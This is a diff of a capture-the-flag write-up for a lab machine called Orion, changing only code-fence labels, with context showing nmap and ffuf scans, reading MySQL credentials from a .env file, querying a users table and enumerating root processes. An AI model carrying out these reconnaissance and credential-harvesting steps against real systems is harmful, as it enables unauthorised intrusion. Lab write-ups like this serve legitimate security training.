@@ -15,7 +15,7 @@ Whenever solving the machine i start with Nmap to scan ip,port and services.
 
 Port Scan :
 
-```Bash
+```bash
 nmap --min-rate 10000  10.129.244.146                                                                                                                 [10:16:30]
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-20 10:16 IST
 Nmap scan report for 10.129.244.146
@@ -30,7 +30,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
 
 Script Scan :
 
-```Bash
+```bash
 nmap -sCV  -p 80,22  10.129.244.146 -Pn                                                                                                               [10:29:39]
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-20 10:30 IST
 Nmap scan report for 10.129.244.146
@@ -56,7 +56,7 @@ Nmap done: 1 IP address (1 host up) scanned in 18.47 seconds
 
 The web application doesn't have any intersting endpoint ,so i did directory fuzzing and i got /admin.Also that is redirecting to login page
 
-```Bash
+```bash
 orca:orion/ $ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -u http://orion.htb/FUZZ 
 
 /'___\  /'___\           /'___\
@@ -107,7 +107,7 @@ Once you got the shell upgrade the shell or get another shell via nc and upgrade
 
 After get into the www-data user shell, user will land on ~/html/craft/web path. In this path nothing intersting stuff,So move one step back directory.There is a .env file. I found MySQL credentials in the `.env` file.
 
-```Bash
+```bash
 www-data@orion:~/html/craft$ cat .env
 # Read about configuration, here:
 # https://craftcms.com/docs/5.x/configure.html
@@ -137,7 +137,7 @@ PRIMARY_SITE_URL=http://orion.htb/
 
 Then login with the creds and get the user's password using the  "SuperSecureCraft123Pass!"
 
-```Bash
+```bash
 www-data@orion:~/html/craft$ mysql -u 'root' -p
 Enter password:
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -155,7 +155,7 @@ You can turn off this feature to get a quicker startup with -A
 Database changed
 ```
 
-```Bash
+```bash
 SHOW * FROM USERS;
 ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '* FROM USERS' at line 1
 MariaDB [orion]> SELECT * FROM USERS;
@@ -192,7 +192,7 @@ Start enumerate:
 
 Then i checked the active port :
 
-```Bash
+```bash
 adam@orion:~$ ss -tulnp
 Netid            State             Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port            Process
 udp              UNCONN            0                 0                            127.0.0.53%lo:53                              0.0.0.0:*
@@ -206,7 +206,8 @@ tcp              LISTEN            0                 128                        
 ```
 
 port 23 is running internally. Then enumerate the services which is run as root
-```Bash
+
+```bash
 ps -ef | grep '^root'
 
 root        1000       1  0 12:04 ?        00:00:00 /usr/sbin/inetutils-inetd
